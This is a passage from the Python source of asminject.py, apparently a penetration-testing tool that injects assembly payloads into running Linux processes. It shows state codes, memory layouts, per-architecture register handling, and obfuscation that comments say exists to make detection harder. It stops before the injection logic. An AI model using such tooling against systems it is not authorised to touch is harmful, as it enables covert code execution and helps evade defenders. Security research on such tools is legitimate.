#!/usr/bin/env python3

f"Python version >= 3.6 required!"
# ^^^ fstrings are valid since python 3.6, will syntax error otherwise

BANNER = r"""
                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.38
Ben Lincoln, Bishop Fox, 2022-08-03
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject
"""

import argparse
import datetime
import inspect
import json
import math
import os
import platform
import psutil
import random
import re
import secrets
import shutil
import signal
import stat
import struct
import sys
import tempfile
import time
import subprocess

from pathlib import Path

class asminject_state_codes:

    def randomize_state_variables(self):
        # randomize state values
        self.state_map["switch_to_new_communication_address"] = secrets.randbelow(self.state_variable_max)
        comparison_list = [self.state_map["switch_to_new_communication_address"]]
        self.state_map["ready_for_stage_two_write"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["ready_for_stage_two_write"])
        self.state_map["stage_two_written"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["stage_two_written"])
        self.state_map["ready_for_memory_restore"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["ready_for_memory_restore"])
        self.state_map["memory_restored"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["memory_restored"])
        self.state_map["payload_to_script_message"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_to_script_message"])
        self.state_map["script_to_payload_message"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["script_to_payload_message"])
        self.state_map["message_received"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["message_received"])
        self.state_map["payload_ready_for_script_cleanup"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_ready_for_script_cleanup"])
        self.state_map["script_cleanup_complete"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["script_cleanup_complete"])
        self.state_map["payload_should_exit"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_should_exit"])
        self.state_map["payload_exiting"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_exiting"])
        self.state_map["payload_awaiting_string"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_awaiting_string"])
        self.state_map["payload_awaiting_binary_data"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_awaiting_binary_data"])
        self.state_map["payload_awaiting_signed_integer"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_awaiting_signed_integer"])
        self.state_map["payload_awaiting_unsigned_integer"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.state_map["payload_awaiting_unsigned_integer"])
        
        # randomize message type indicators
        self.message_type_map["signed_integer"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.message_type_map["signed_integer"])
        self.message_type_map["unsigned_integer"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.message_type_map["unsigned_integer"])
        self.message_type_map["pointer_to_binary_data"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.message_type_map["pointer_to_binary_data"])
        self.message_type_map["pointer_to_string_data"] = asminject_parameters.get_secure_random_not_in_list(self.state_variable_max, comparison_list)
        comparison_list.append(self.message_type_map["pointer_to_string_data"])
    
    def get_state_name_from_value(self, val):
        for k in self.state_map.keys():
            if val == self.state_map[k]:
                return f"{k} ({hex(val)})"
        #return None
        result_text = "[null]"
        if val:
            result_text = hex(val)
        return f"unknown state {result_text}"
    
    def get_message_type_name_from_value(self, val):
        for k in self.message_type_map.keys():
            if val == self.message_type_map[k]:
                return k
        #return None
        result_text = "[null]"
        if val:
            result_text = hex(val)
        return f"unknown message type {result_text}"
        
    def __init__(self):
        self.state_variable_max = 0xFFFFFF
        self.state_map = {}
        self.message_type_map = {}
        
        # state values
        # stage 1 has allocated memory and is ready to switch to a new communication address
        self.state_map["switch_to_new_communication_address"] = 47
        # stage 1 is ready for stage 2 to be written
        self.state_map["ready_for_stage_two_write"] = self.state_map["switch_to_new_communication_address"] * 2
        # the script has written stage 2 and is ready for stage 1 to launch stage 2
        self.state_map["stage_two_written"] = self.state_map["switch_to_new_communication_address"] * 3
        # the payload is ready for the script to restore target process memory to its pre-injection state
        self.state_map["ready_for_memory_restore"] = self.state_map["switch_to_new_communication_address"] * 4
        # the script has restored target process memory
        self.state_map["memory_restored"] = self.state_map["switch_to_new_communication_address"] * 5
        # the payload has data to send back to the script
        self.state_map["payload_to_script_message"] = self.state_map["switch_to_new_communication_address"] * 6
        # the script has data to send to the payload
        self.state_map["script_to_payload_message"] = self.state_map["switch_to_new_communication_address"] * 7
        # the current message has been received, and the waiting party can proceed
        self.state_map["message_received"] = self.state_map["switch_to_new_communication_address"] * 8#
        # the script wants the payload to stop executing (for persistent/looping payloads, etc.)
        self.state_map["payload_should_exit"] = self.state_map["switch_to_new_communication_address"] * 9
        # the payload is exiting (either because it completed or because the script told it to exit)
        self.state_map["payload_exiting"] = self.state_map["switch_to_new_communication_address"] * 10
        # the payload wants the script to send a string
        self.state_map["payload_awaiting_string"] = self.state_map["switch_to_new_communication_address"] * 11
        # the payload wants the script to send raw binary data
        self.state_map["payload_awaiting_binary_data"] = self.state_map["switch_to_new_communication_address"] * 11
        # the payload wants the script to send an immediate integer value
        self.state_map["payload_awaiting_signed_integer"] = self.state_map["switch_to_new_communication_address"] * 13
        self.state_map["payload_awaiting_unsigned_integer"] = self.state_map["switch_to_new_communication_address"] * 14
        
        # message type indicators
        # immediate values of whatever the word length is for the platform - only data 1 used
        self.message_type_map["signed_integer"] = self.state_map["switch_to_new_communication_address"] * 101
        self.message_type_map["unsigned_integer"] = self.state_map["switch_to_new_communication_address"] * 102
        # pointers to data in memory - pointer in data 1, number of bytes in data 2
        self.message_type_map["pointer_to_binary_data"] = self.state_map["switch_to_new_communication_address"] * 103
        self.message_type_map["pointer_to_string_data"] = self.state_map["switch_to_new_communication_address"] * 104

class asminject_parameters:
    # because random.shuffle with a random function is deprecrated in Python 3.9
    @staticmethod
    def get_securely_shuffled_array(arr):
        result = []
        temp_array_1 = []
        for i in range(0, len(arr)):
            temp_array_1.append(arr[i])
        while len(temp_array_1) > 0:
            rand_index = secrets.randbelow(len(temp_array_1))
            result.append(temp_array_1.pop(rand_index))
        
        return result

    @staticmethod
    def get_random_float_for_shuffle():
        internal_range = 1000
        # internal_val = float(secrets.randbelow(internal_range + 1))
        #return internal_val / float(internal_range)
        # secrets.randbelow is picky
        #internal_val = float(secrets.randbelow(internal_range + 1)) / float(internal_range)
        internal_val = float(secrets.randbelow(internal_range)) / float(internal_range)
        if internal_val > 1.0:
            internal_val = 1.0
        if internal_val < 0.0:
            internal_val = 0.0
        
        return internal_val
            
    
    @staticmethod
    def get_secure_random_not_in_list(max_value, list_of_existing_values):
        result = secrets.randbelow(max_value)
        while result in list_of_existing_values:
            result = secrets.randbelow(max_value)
        return result

    @staticmethod
    def get_timestamp_string():
        return datetime.datetime.utcnow().isoformat()
    
    @staticmethod
    def get_timestamp_string_for_paths():
        result = asminject_parameters.get_timestamp_string()
        # replace the "+00:00" with "Z" in case it shows up
        # because "-[offset]" instead of "+[offset]" would be inaccurate
        result = result.replace("+00:00", "Z")
        # replace delimiters that are frequently problematic in paths:
        #result = re.sub('[: ]', '-', result)
        # remove any other unexpected characters
        # result = re.sub('[^0-9\-TZ]', '', result)
        # as well as characters that make it easier to recognize the string as asminject.py's
        result = re.sub('[^0-9]', '', result)
        return result

    def set_rwr_arbitrary_data_block_values(self):
        self.rwr_arbitrary_data_offset = self.rwr_reserved_offset + self.rwr_reserved_length
        self.rwr_arbitrary_data_length = self.read_write_region_size - self.rwr_arbitrary_data_offset

    @staticmethod
    def get_next_largest_multiple(existing_value, modulus):
        result = existing_value
        while (result % modulus) > 0:
            result += 1
        return result
    
    @staticmethod
    def get_random_memory_block_size(min_value, max_value, allocation_unit_size):
        value_range = max_value - min_value
        r1 = secrets.randbelow(value_range) + min_value
        return asminject_parameters.get_next_largest_multiple(r1, allocation_unit_size)

    def get_region_info_template(self, region_base_address, offset, length, perm_string):
        result = memory_map_entry()
        if not region_base_address:
            #print("Missing base address!")
            return result
        # Can't check these for null because 0 matches "not"
        # if not offset:
            # print("Missing offset!")
            # return result
        # if not length:
            # print("Missing length!")
            # return result
        result.start_address = region_base_address + offset
        result.end_address = result.start_address + length
        result.set_permissions_from_string(perm_string)
        return result

    def get_region_info_communication(self):
        return self.get_region_info_template(self.read_write_region_address, self.rwr_communication_offset, self.rwr_communication_length, "rw-p")
    
    def get_region_info_cpu_state_backup(self):
        return self.get_region_info_template(self.read_write_region_address, self.rwr_cpu_state_backup_offset, self.rwr_cpu_state_backup_length, "rw-p")
    
    def get_region_info_stack_backup(self):
        return self.get_region_info_template(self.read_write_region_address, self.rwr_stack_backup_offset, self.rwr_stack_backup_length, "rw-p")
    
    def get_region_info_arbitrary_data(self):
        return self.get_region_info_template(self.read_write_region_address, self.rwr_arbitrary_data_offset, self.rwr_arbitrary_data_length, "rw-p")

    def get_base_communication_address(self):
        if self.read_write_region_address:
            if self.get_region_info_communication().start_address:
                return self.get_region_info_communication().start_address
        return self.initial_communication_address

    # this location is randomized to make detection more difficult
    def set_initial_communication_address(self):
        if self.existing_read_write_address:
            # If there's an existing r/w block in use, no need to write to the stack at all
            self.initial_communication_address = self.existing_read_write_address
        else:
            stack_size = self.stack_region.end_address - self.stack_region.start_address
            # Basically just use most of the upper half of the stack region, evenly divisible by the word length
            comms_address_min_offset = int(stack_size / 2)
            comms_address_max_offset = stack_size - (self.register_size * 6)
            comms_address_offset = asminject_parameters.get_random_memory_block_size(comms_address_min_offset, comms_address_max_offset, self.register_size)
            self.initial_communication_address = self.stack_region.start_address + comms_address_offset

    def cache_obfuscation_files(self, recreate_existing_cache = False):
        if recreate_existing_cache or not self.obfuscation_files_cached:
            self.obfuscation_fragments_general_purpose = []
            self.obfuscation_fragments_communications_address = []
            self.obfuscation_fragments_allocated_memory = []
            
            base_fragment_file_path = os.path.join(self.base_script_path, "asm", self.architecture, self.fragment_directory_name, "obfuscation")
            fragment_subdirectory_names = ["general_purpose", "communications_address", "allocated_read_write"]
            for subdirectory_name in fragment_subdirectory_names:
                current_fragment_directory_path = os.path.join(base_fragment_file_path, subdirectory_name)
                for directory_entry in os.listdir(current_fragment_directory_path):
                    entry_path = os.path.join(current_fragment_directory_path, directory_entry)
                    if os.path.isfile(entry_path):
                        try:
                            with open(entry_path, "r") as fragment_source_file:
                                fragment_source = fragment_source_file.read()
                                if subdirectory_name == "general_purpose":
                                    self.obfuscation_fragments_general_purpose.append(fragment_source)
                                if subdirectory_name == "communications_address":
                                    self.obfuscation_fragments_communications_address.append(fragment_source)
                                if subdirectory_name == "allocated_read_write":
                                    self.obfuscation_fragments_allocated_memory.append(fragment_source)
                        except Exception as e:
                            log_error(f"Could not read assembly obfuscation source code fragment '{entry_path}': {e}", ansi=self.ansi)
                            return None
        
        self.obfuscation_files_cached = True
    
    def populate_randomized_state_backup_restore_list(self, repopulate_existing = False):
        if repopulate_existing or len(self.randomized_backup_restore_instruction_list) == 0:
            self.randomized_backup_restore_instruction_list = []
            for i in range(0, len(self.state_backup_restore_instruction_list)):
                self.randomized_backup_restore_instruction_list.append(self.state_backup_restore_instruction_list[i])
            self.randomized_backup_restore_instruction_list = asminject_parameters.get_securely_shuffled_array(self.randomized_backup_restore_instruction_list)
    
    def get_randomized_state_backup_instruction_list(self):
        result = ""
        for i in range(0, len(self.randomized_backup_restore_instruction_list)):
            result = f"{result}{self.randomized_backup_restore_instruction_list[i][0]}\n"
        return result
        
    def get_randomized_state_restore_instruction_list(self):
        result = ""
        for i in range(0, len(self.randomized_backup_restore_instruction_list)):
            result = f"{result}{self.randomized_backup_restore_instruction_list[(len(self.randomized_backup_restore_instruction_list) - 1) - i][1]}\n"
        return result

    def set_communications_address_config(self):
        value_count = 0
        
        self.communication_address_offset_payload_state = self.register_size * value_count
        value_count += 1
        
        self.communication_address_offset_script_state = self.register_size * value_count
        value_count += 1
        
        # Addresses of read/execute and read/write memory - dedicated storage because they're referred to so frequently
        self.communication_address_offset_read_execute_base_address = self.register_size * value_count
        value_count += 1
        self.communication_address_offset_read_write_base_address = self.register_size * value_count
        value_count += 1
        
        # One message type and two arbitrary words for the payload to send data to the script
        self.communication_address_offset_payload_data_type = self.register_size * value_count
        value_count += 1
        self.communication_address_offset_payload_data_1 = self.register_size * value_count
        value_count += 1
        self.communication_address_offset_payload_data_2 = self.register_size * value_count
        value_count += 1
        
        # One message type and two arbitrary words for the script to send data to the payload
        self.communication_address_offset_script_data_type = self.register_size * value_count
        value_count += 1
        self.communication_address_offset_script_data_1 = self.register_size * value_count
        value_count += 1
        self.communication_address_offset_script_data_2 = self.register_size * value_count
        value_count += 1
        
        self.communication_address_backup_size = self.register_size * value_count

    def __init__(self):
        # memory regions must be evenly divisible by this amount
        # (currently only to make sure that memory overwrite doesn't extend 
    
        # x86-64: 8 bytes * 16 registers
        self.stack_backup_size = 8 * 16
        
        # CPU register width in bytes
        self.register_size = 8
        self.register_size_format_string = 'Q'
        
        self.flag_setting_instructions = [ "cmp" ]
        self.no_obfuscation_after_instructions = []
        
        # Temporary communication address for use before stage one allocates the r/w block
        #self.communication_address_offset = -40
        #self.communication_address_backup_size = 24
        self.set_communications_address_config()
        
        self.initial_communication_address = None
        
        self.general_purpose_register_list = []
        # set of tuples containing any state backup/restore instructions for the architecture, so that the order can be randomized
        # replaces the [STATE_BACKUP_INSTRUCTIONS] and [STATE_RESTORE_INSTRUCTIONS] placeholders in stage 1 and 2
        # each tuple should contain a single equivalent backup/restore instruction pair, since the order is reverse during restoration
        self.state_backup_restore_instruction_list = []
        self.randomized_backup_restore_instruction_list = []
        
        # 512 is the minimum for the x86-64 fxsave instruction
        #self.cpu_state_size = 1024
        # Might need to make this dynamic based on the stack backup size
        #self.existing_stack_backup_location_size = 2048
        #self.existing_stack_backup_location_offset = 1024
        #self.new_stack_size = 2048
        #self.new_stack_location_offset = 1024
        #self.arbitrary_read_write_data_size = 2048
        #self.arbitrary_read_write_data_location_offset = 0
        # When allocating memory, use blocks evenly divisible by this amount:
        self.allocation_unit_size = 0x1000
        
        self.read_execute_region_address = None
        self.read_execute_region_size_min = 0x8000
        #self.read_execute_region_size_max = 0x200000
        self.read_execute_region_size_max = 0x90000
        #self.read_execute_region_size = 0x8000
        self.read_execute_region_size = asminject_parameters.get_random_memory_block_size(self.read_execute_region_size_min, self.read_execute_region_size_max, self.allocation_unit_size)

        self.read_write_region_address = None
        self.read_write_region_size_min = 0x10000
        #self.read_write_region_size_max = 0x200000
        self.read_write_region_size_max = 0x90000
        #self.read_write_region_size = 0x10000
        self.read_write_region_size = asminject_parameters.get_random_memory_block_size(self.read_write_region_size_min, self.read_write_region_size_max, self.allocation_unit_size)
        
        # r/w block map
        # sub-region 1: post-allocation script/payload communication
        self.rwr_communication_offset = 0x0
        self.rwr_communication_length = 0x1000
        # sub-region 2: pre-injection CPU state backup (fxsave/fxrstor or similar)
        self.rwr_cpu_state_backup_offset = 0x1000
        self.rwr_cpu_state_backup_length = 0x1000
        # sub-region 3: stage 1 stack backup containing CPU register data
        # from immediately after injection
        self.rwr_stack_backup_offset = 0x2000
        self.rwr_stack_backup_length = 0x1000
        # reserved space
        self.rwr_reserved_offset = 0x3000
        self.rwr_reserved_length = 0x3000
        # sub-region X: arbitrary read/write block 
        self.set_rwr_arbitrary_data_block_values()
        
        self.stack_region = None
        
        # number of seconds the stage 1 and stage 2 code should sleep
        # every iteration they are waiting for something
        self.stage_sleep_seconds = 1
        
        # For "slow" mode
        self.high_priority_nice = -20
        self.low_priority_nice = 20

        self.sleep_time_waiting_for_syscalls = 0.1
        self.max_address_npic_suggestion = 0x00400000
        
        # More than anyone will ever intentionally use
        # But low enough that the script will time out in a reasonable amount of time if there's an infinite loop
        self.max_fragment_recursion = 1000
        
        # Making this slightly more than 1 second so that it should be impossible
        # For the stage/shellcode and the script to get stuck in a state where 
        # They're exactly out of sync
        self.wait_delay = 1.1
        self.restore_delay = 0.0
        
        # Randomized from initial state to make detection more challenging
        # self.state_variable_max = 0xFFFFFF
        # self.state_map["ready_for_stage_two_write"] = 47
        # self.state_map["stage_two_written"] = self.state_map["ready_for_stage_two_write"] * 2
        # self.state_map["ready_for_memory_restore"] = self.state_map["ready_for_stage_two_write"] * 3
        # self.state_map["memory_restored"] = self.state_map["ready_for_stage_two_write"] * 4
        # self.randomize_state_variables()
        self.state_variables = asminject_state_codes()
        self.state_variables.randomize_state_variables()
        
        self.base_script_path = ""
        self.pid = -1
        self.asm_path = ""
        self.relative_offsets = {}
        self.non_pic_binaries = []
        self.architecture = ""
        self.stop_method="sigstop"
        self.ansi=True
        self.pause_before_resume = False
        self.pause_before_launching_stage2 = False
        self.pause_before_memory_restore = False
        self.pause_after_memory_restore = False
        self.precompiled_shellcode = None
        self.custom_replacements = {}
        self.delete_temp_files = True
        self.write_assembly_source_to_disk = False
        self.existing_stage_1_source = None
        self.existing_stage_2_source = None

        self.freeze_dir = "/sys/fs/cgroup/freezer/" + secrets.token_bytes(8).hex()
        self.fragment_directory_name = "fragments"
        self.payload_assembly_subdirectory_name = "assembly"
        self.memory_region_backup_subdirectory_name = "memory"
        
        self.asminject_pid = None
        self.asminject_priority = None
        self.asminject_priority_original = None
        self.target_priority = None
        self.target_priority_original = None
        self.asminject_affinity = None
        self.asminject_affinity_original = None
        self.target_affinity = None
        self.target_affinity_original = None
        self.target_process = None
        self.shared_affinity = None
        
        self.shellcode_section_delimiter = "SHELLCODE_SECTION_DELIMITER"
        self.precompiled_shellcode_label = "precompiled_shellcode"
        self.post_shellcode_label = "post_shellcode_section"
        self.inline_shellcode_placeholder = "[VARIABLE:INLINE_SHELLCODE:VARIABLE]"
        self.fragment_placeholder = "[FRAGMENTS]"
        
        self.enable_debugging_output = False
        self.clear_payload_memory_after_execution = False
        # wait this many seconds after the payload has indicated it is ready for cleanup before wiping memory
        self.clear_payload_memory_delay = 2.0
        # will be expanded to the register size for the platform
        self.clear_payload_memory_value = 0x00
        
        self.instruction_pointer_register_name = "RIP"
        self.stack_pointer_register_name = "RSP"
        
        self.saved_instruction_pointer_value = None
        self.saved_stack_pointer_value = None
        self.code_backup_length = None
        
        # deallocate the r/w memory allocated by stage 1 when stage 2 is about to exit
        # haven't come up with a way to deallocate the r/x memory
        self.deallocate_memory = True
        # If these values are not None, then stage 1 will use the specified locations 
        # for read/write and/or read/execute purposes
        # to avoid repeated allocate/deallocate operations and memory leak if injecting
        # into the same process repeatedly
        self.existing_read_write_address = None
        self.existing_read_execute_address = None
        
        self.internal_memory_region_restore_ignore_list = [ '[vdso]', '[vvar]' ]
        self.restore_memory_region_regexes = []
        self.restore_all_memory_regions = False
        self.backup_chunk_size = 0x1000
        
        timestamp_string = asminject_parameters.get_timestamp_string_for_paths()
        random_string = hex(secrets.randbelow(0xFFFFFFF)).replace("0x", "")
        self.temp_file_base_directory = os.path.join(tempfile.gettempdir(), f"{timestamp_string}{random_string}")
        
        self.relative_offsets_from_binaries = False
        self.obfuscate_payloads = False
        self.per_line_obfuscation_percentage = 0.25
        self.obfuscation_iterations = 1
        self.obfuscation_fragment_counter = 0
        self.obfuscation_files_cached = False
        self.obfuscation_fragments_allocated_memory = []
        self.obfuscation_fragments_general_purpose = []
        self.obfuscation_fragments_communications_address = []
        
    def set_dynamic_process_info_vars(self):
        self.target_process = psutil.Process(self.pid)
        self.asminject_pid = os.getpid()
        self.asminject_process = psutil.Process(self.asminject_pid)
        self.asminject_priority = self.asminject_process.nice()
        self.target_priority = self.target_process.nice()
        self.asminject_affinity = self.asminject_process.cpu_affinity()
        self.target_affinity = self.target_process.cpu_affinity()
        
        # Only set these the first time
        if not self.asminject_priority_original:
            self.asminject_priority_original = self.asminject_priority
        if not self.target_priority_original:
            self.target_priority_original = self.target_priority
        if not self.asminject_affinity_original:
            self.asminject_affinity_original = self.asminject_affinity
        if not self.target_affinity_original:
            self.target_affinity_original = self.target_affinity
        if not self.shared_affinity:
            if len(self.asminject_affinity) == 1:
                self.shared_affinity = self.asminject_affinity
            else:
                self.shared_affinity = [self.asminject_affinity[0]]

    def set_architecture(self, architecture_string):
        self.architecture = architecture_string
        
        if self.architecture == "x86-64":
            self.register_size = 8
            self.register_size_format_string = 'Q'
            self.stage_sleep_seconds = 2
            # 8 bytes * 16 registers
            self.stack_backup_size = 8 * 16
            self.communication_address_backup_size = 32
            self.instruction_pointer_register_name = "RIP"
            self.stack_pointer_register_name = "RSP"
            self.general_purpose_register_list = ["rax", "rbx", "rcx", "rdx", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
            #self.state_backup_restore_instruction_list = [ ("pushfq", "popfq"), ("push rax", "pop rax"), ("push rbx", "pop rbx"), ("push rcx", "pop rcx"), ("push rdx", "pop rdx"), ("push rbp", "pop rbp"), ("push rsi", "pop rsi"), ("push rdi", "pop rdi"), ("push r8", "pop r8"), ("push r9", "pop r9"), ("push r10", "pop r10"), ("push r11", "pop r11"), ("push r12", "pop r12"), ("push r13", "pop r13"), ("push r14", "pop r14"), ("push r15", "pop r15") ]
            self.state_backup_restore_instruction_list = [ ("push rax", "pop rax"), ("push rbx", "pop rbx"), ("push rcx", "pop rcx"), ("push rdx", "pop rdx"), ("push rbp", "pop rbp"), ("push rsi", "pop rsi"), ("push rdi", "pop rdi"), ("push r8", "pop r8"), ("push r9", "pop r9"), ("push r10", "pop r10"), ("push r11", "pop r11"), ("push r12", "pop r12"), ("push r13", "pop r13"), ("push r14", "pop r14"), ("push r15", "pop r15") ]
            self.flag_setting_instructions = [ "cmp" ]
            self.no_obfuscation_after_instructions = [ "leave" ]
        if self.architecture == "x86":
            self.register_size = 4
            self.register_size_format_string = 'L'
            self.stage_sleep_seconds = 2
            # 4 bytes * 16 registers
            self.stack_backup_size = 4 * 16
            self.communication_address_backup_size = 32
            self.instruction_pointer_register_name = "EIP"
            self.stack_pointer_register_name = "ESP"
            self.general_purpose_register_list = ["eax", "ebx", "ecx", "edx"]

            #self.state_backup_restore_instruction_list = [ ("push eax", "pop eax"), ("push ebx", "pop ebx"), ("push ecx", "pop ecx"), ("push edx", "pop edx"), ("push ebp", "pop ebp"), ("push esi", "pop esi"), ("push edi", "pop edi"), ("push cs", "pop cs"), ("push ds", "pop ds"), ("push es", "pop es"), ("push fs", "pop fs"), ("push gs", "pop gs"), ("push ss", "pop ss") ]
            self.state_backup_restore_instruction_list = [ ("push eax", "pop eax"), ("push ebx", "pop ebx"), ("push ecx", "pop ecx"), ("push edx", "pop edx"), ("push ebp", "pop ebp"), ("push esi", "pop esi"), ("push edi", "pop edi")]
            self.flag_setting_instructions = [ "cmp" ]
            # x86 code uses a lot of these kinds of logic:
            # "set a pointer to the address of the data after this jmp"
            # ...which involves an uninterrupted sequence of call => pop => add => jmp
            self.no_obfuscation_after_instructions = [ "add", "call", "jmp", "pop", "leave" ]
        if self.architecture == "arm32":
            self.register_size = 4
            self.register_size_format_string = 'L'
            # 4 bytes * 13 registers
            #self.stack_backup_size = 4 * 12
            self.stack_backup_size = 8 * 16
            self.communication_address_backup_size = 16
            # ARM32 doesn't seem to trigger the Linux "in a syscall" state
            # for long enough for the script to catch unless this value is 
            # around 5 seconds.
            #self.stage_sleep_seconds = 5
            self.stage_sleep_seconds = 2
            self.instruction_pointer_register_name = "pc"
            self.stack_pointer_register_name = "sp"
            self.general_purpose_register_list = ["r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11"]
            self.state_backup_restore_instruction_list = [ ("stmdb sp!,{r0-r11}", "ldmia sp!, {r0-r11}")   ]
            self.flag_setting_instructions = [ "cmp", "cmn", "tst", "teq" ]
            self.no_obfuscation_after_instructions = [ "ldr", "b", "bx", "bl", "blx"]
        self.populate_randomized_state_backup_restore_list()
        self.set_communications_address_config()
    
    def get_value_or_placeholder(self, value, placeholder_value):
        if value or value == 0:
            return value
        else:
            return placeholder_value
    
    def get_hex_value_or_placeholder(self, value, placeholder_value):
        result_temp = self.get_value_or_placeholder(value, placeholder_value)
        if result_temp or result_temp == 0:
            return hex(result_temp)
        return '____BUG_IN_CODE____'
        
    def get_general_purpose_register_replacement_map(self):
        result = {}
        gpr_list = []
        for i in range(0, len(self.general_purpose_register_list)):
            gpr_list.append(self.general_purpose_register_list[i])
        #random.shuffle(gpr_list, asminject_parameters.get_random_float_for_shuffle)
        gpr_list = asminject_parameters.get_securely_shuffled_array(gpr_list)
        for i in range(0, len(self.general_purpose_register_list)):
            result[f"%r{i}%"] = gpr_list[i]
        return result
    
    # placeholder_value_address is a value that represents a valid address
    # so that e.g. the stage 2 test assembly will succeed
    # leave it as None for the real assembly so that bugs won't cause silent failures
    def get_replacement_variable_map(self, placeholder_value_address = None):
        result = {}
        for k in self.custom_replacements.keys():
            result[k] = self.custom_replacements[k]
    
        result['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.get_region_info_arbitrary_data().start_address, placeholder_value_address)
        #result['[VARIABLE:CLEAR_PAYLOAD_MEMORY_VALUE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.clear_payload_memory_value, placeholder_value_address)
        result['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.get_base_communication_address(), placeholder_value_address)
        result['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.rwr_cpu_state_backup_length, placeholder_value_address)
        result['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.get_region_info_stack_backup().start_address, placeholder_value_address)
        result['[VARIABLE:EXISTING_STACK_BACKUP_LOCATION_OFFSET:VARIABLE]'] = self.get_hex_value_or_placeholder(self.rwr_stack_backup_offset, placeholder_value_address)
        result['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.saved_instruction_pointer_value, placeholder_value_address)
        result['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = self.get_hex_value_or_placeholder(self.code_backup_length, placeholder_value_address)
        result['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{self.post_shellcode_label}"
        result['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{self.precompiled_shellcode_label}"
        result['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.read_execute_region_address, placeholder_value_address)
        result['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.read_execute_region_size, placeholder_value_address)
        result['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.read_write_region_address, placeholder_value_address)
        result['[VARIABLE:RWR_CPU_STATE_BACKUP_OFFSET:VARIABLE]'] = self.get_hex_value_or_placeholder(self.rwr_cpu_state_backup_offset, placeholder_value_address)
        rw_region_address = None
        if self.read_write_region_address and self.read_write_region_size:
            rw_region_address = self.read_write_region_address + self.read_write_region_size
        result['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = self.get_hex_value_or_placeholder(rw_region_address, placeholder_value_address)
        result['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.read_write_region_size, placeholder_value_address)
        result['[VARIABLE:STACK_POINTER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.saved_stack_pointer_value, placeholder_value_address)
        result['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{self.stage_sleep_seconds}"
        
        # communications address offsets
        offset_placeholder = None
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_PAYLOAD_STATE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_payload_state, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_SCRIPT_STATE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_script_state, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_READ_EXECUTE_BASE_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_read_execute_base_address, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_READ_WRITE_BASE_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_read_write_base_address, offset_placeholder)
